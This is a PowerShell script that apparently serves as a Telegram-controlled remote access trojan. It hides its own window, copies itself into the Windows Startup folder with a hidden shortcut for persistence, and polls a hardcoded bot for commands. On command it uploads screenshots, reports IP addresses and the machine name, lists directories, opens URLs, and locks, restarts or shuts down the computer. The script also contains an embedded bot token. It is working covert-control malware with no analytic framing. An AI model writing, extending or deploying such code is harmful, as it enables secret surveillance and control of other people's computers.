# Relaunch in background and auto-close visible window
if (-not $env:PS_RUN_HIDDEN) {
    $env:PS_RUN_HIDDEN = "1"
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = "powershell.exe"
    $psi.Arguments = "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File `"$PSCommandPath`""
    $psi.WindowStyle = 'Hidden'
    $psi.UseShellExecute = $true
    [System.Diagnostics.Process]::Start($psi) | Out-Null
    exit
}

# Telegram-Controlled PowerShell Script
$botToken = "7462575551:AAG66o16VhlQu_26sfPaEpIxvhRWKeHBh04"
$userId = "5036966807"
$apiUrl = "https://api.telegram.org/bot$botToken"
$lastUpdateId = 0

function Send-TelegramMessage {
    param (
        [string]$chatId,
        [string]$message
    )
    Invoke-RestMethod "$apiUrl/sendMessage" -Method Post -ContentType "application/json" -Body (@{
        chat_id = $chatId
        text = $message
    } | ConvertTo-Json -Depth 10)
}

function Get-LocalIP {
    $ipInfo = Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.PrefixLength -eq 24}
    return $ipInfo.IPAddress -join ' '
}

function Get-PublicIP {
    try {
        $publicIP = Invoke-RestMethod -Uri "https://api.ipify.org?format=json" -Method Get
        return $publicIP.ip
    } catch {
        return "Unable to retrieve public IP."
    }
}

function Send-Screenshot {
    param (
        [string]$chatId
    )
    try {
        $screenshotPath = "$env:TEMP\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
        $bitmap.Save($screenshotPath)
        $graphics.Dispose()
        $bitmap.Dispose()

        $form = @{ chat_id = $chatId; photo = Get-Item $screenshotPath }
        Invoke-RestMethod -Uri "$apiUrl/sendPhoto" -Method Post -Form $form
        Remove-Item $screenshotPath -Force -ErrorAction SilentlyContinue
        return $true
    } catch {
        return $false
    }
}

function Get-PCName {
    return $env:COMPUTERNAME
}

function Send-HelpMessage {
    param ([string]$chatId)
    $helpMessage = @"
Available Commands:

/help - Displays this help message.
/open_notepad - Opens Notepad.
/visit <url> - Opens a URL in the browser.
/lock - Locks workstation.
/restart - Restarts the computer.
/shutdown - Shuts down the computer.
/get_ip - Shows local and public IP.
/screenshot - Sends a screenshot.
/get_pcname - Shows the computer name.
cd <path> - Change directory.
cd - Show current directory.
ls or dir - List files and folders.
"@
    Send-TelegramMessage -chatId $chatId -message $helpMessage
}

Send-TelegramMessage -chatId $userId -message "System is running"

$scriptPath = $MyInvocation.MyCommand.Path
$scriptName = [System.IO.Path]::GetFileName($scriptPath)
$startupFolder = [System.Environment]::GetFolderPath('Startup')
$destinationPath = Join-Path $startupFolder $scriptName
if (-not (Test-Path $destinationPath)) {
    Copy-Item -Path $scriptPath -Destination $destinationPath
}

$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut([System.IO.Path]::Combine($startupFolder, "$scriptName.lnk"))
$shortcut.TargetPath = "powershell.exe"
$shortcut.Arguments = "-WindowStyle Hidden -File `"$destinationPath`""
$shortcut.Save()

while ($true) {
    try {
        $updates = Invoke-RestMethod "$apiUrl/getUpdates?offset=$($lastUpdateId + 1)&timeout=10"
        foreach ($update in $updates.result) {
            $lastUpdateId = $update.update_id
            $chatId = $update.message.chat.id
            $text = $update.message.text.Trim()

            if ($chatId -ne $userId) { continue }

            if (-not $global:CurrentDirectory) {
                $global:CurrentDirectory = (Get-Location).Path
            }

            if ($text -match "^cd\s+(.*)") {
                $targetPath = $matches[1].Trim('"')
                if (-not [System.IO.Path]::IsPathRooted($targetPath)) {
                    $targetPath = Join-Path $global:CurrentDirectory $targetPath
                }
                if (Test-Path $targetPath -PathType Container) {
                    $global:CurrentDirectory = (Resolve-Path $targetPath).Path
                    $reply = "Changed directory to: $global:CurrentDirectory"
                } else {
                    $reply = "Directory not found: $targetPath"
                }
            }
            elseif ($text -match "^cd$") {
                $reply = "Current directory: $global:CurrentDirectory"
            }
            elseif ($text -match "^(ls|dir)$") {
                try {
                    $items = Get-ChildItem -Path $global:CurrentDirectory | Select-Object Name
                    $reply = if ($items) {
                        "Files and folders in $global:CurrentDirectory:`n" + ($items.Name -join "`n")
                    } else {
                        "No files or folders found in $global:CurrentDirectory"
                    }
                } catch {
                    $reply = "Error reading directory: $_"
                }
            }
            elseif ($text -eq "/help") {
                Send-HelpMessage -chatId $chatId
                continue
            }
            elseif ($text -eq "/get_ip") {
                $localIP = Get-LocalIP
                $publicIP = Get-PublicIP
                $reply = "Local IP: $localIP`nPublic IP: $publicIP"
            }
            elseif ($text -eq "/get_pcname") {
                $pcName = Get-PCName
                $reply = "Computer Name: $pcName"
            }
            elseif ($text -eq "/open_notepad") {
                Start-Process notepad.exe
                $reply = "Notepad opened."
            }
            elseif ($text -match "^/visit\s+(http[s]?:\/\/.*)") {
                $url = $matches[1]
                [System.Diagnostics.Process]::Start($url)
                $reply = "Opened in browser: $url"
            }
            elseif ($text -eq "/lock") {
                rundll32.exe user32.dll,LockWorkStation
                $reply = "System locked."
            }
            elseif ($text -eq "/restart") {
                shutdown /r /t 0
                $reply = "Restarting system..."
            }
            elseif ($text -eq "/shutdown") {
                shutdown /s /t 0
                $reply = "Shutting down system..."
            }
            elseif ($text -eq "/screenshot") {
                $reply = "Taking screenshot..."
                Send-TelegramMessage -chatId $chatId -message $reply
                $success = Send-Screenshot -chatId $chatId
                if ($success) {
                    $reply = "Screenshot sent."
                } else {
                    $reply = "Failed to capture screenshot."
                }
            }
            else {
                $reply = "Unknown command."
            }

            Send-TelegramMessage -chatId $chatId -message $reply
        }
        Start-Sleep -Seconds 2
    } catch {
        Write-Host "Error: $_"
        Start-Sleep -Seconds 5
    }
}
